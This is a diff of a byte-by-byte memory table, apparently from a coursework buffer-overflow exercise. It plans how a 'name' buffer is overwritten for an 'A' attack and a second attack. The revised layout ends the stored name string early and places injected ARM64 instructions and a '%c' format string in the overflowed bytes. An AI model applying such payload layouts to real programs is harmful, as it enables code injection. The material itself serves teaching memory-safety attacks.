@@ -128,23 +128,23 @@ Address (in hex)    Description     Intended Content ("A" attack)	Intended Conte
 0x420058            name[0]         'M'								'M'
 0x420059            name[1]         'a'								'a'
 0x42005a            name[2]         'x'								'x'
-0x42005b            name[3]         'w'								'w'
-0x42005c            name[4]         'e'								'e'
-0x42005d            name[5]         'l'								'l'
-0x42005e            name[6]         'l'								'l'
+0x42005b            name[3]         'w'								' '
+0x42005c            name[4]         'e'								'a'
+0x42005d            name[5]         'l'								'n'
+0x42005e            name[6]         'l'								'd'
 0x42005f            name[7]         ' '								' '
-0x420060            name[8]         'a'								'a'
-0x420061            name[9]         'n'								'n'
-0x420062            name[10]        'd' 							'd'
-0x420063            name[11]        ' '								' '
-0x420064            name[12]        'M' 							'M'
-0x420065            name[13]        'e' 							'e'
-0x420066            name[14]        'l' 							'l'
-0x420067            name[15]        'o' 							'o'
-0x420068            name[16]        'd' 							'd'
-0x420069            name[17]        'y' 							'y'
-0x42006a            name[18]        '\0' 							'\0'
-0x42006b            name[19]        
+0x420060            name[8]         'a'								'M'
+0x420061            name[9]         'n'								'e'
+0x420062            name[10]        'd' 							'l'
+0x420063            name[11]        ' '								'o'
+0x420064            name[12]        'M' 							'd'
+0x420065            name[13]        'e' 							'y'
+0x420066            name[14]        'l' 							'\0'
+0x420067            name[15]        'o' 							
+0x420068            name[16]        'd' 							mov x1, #0x0A /* #15 "\n" */
+0x420069            name[17]        'y' 							||
+0x42006a            name[18]        '\0' 							||
+0x42006b            name[19]        								||
 0x42006c            name[20]        mov w1, #0x41 /* #65 "A" */		adr x0, 0x420074 /* location of new string */
 0x42006d            name[21]        ||								||
 0x42006e            name[22]        ||								||
@@ -170,7 +170,7 @@ Address (in hex)    Description     Intended Content ("A" attack)	Intended Conte
 0x420082            name[42]										'd'
 0x420083            name[43]										'e'
 0x420084            name[44]										'.'
-0x420085            name[45]										'\n'
+0x420085            name[45]										'%c'
 0x420086            name[46]										'\0'
 0x420087            name[47]										
 
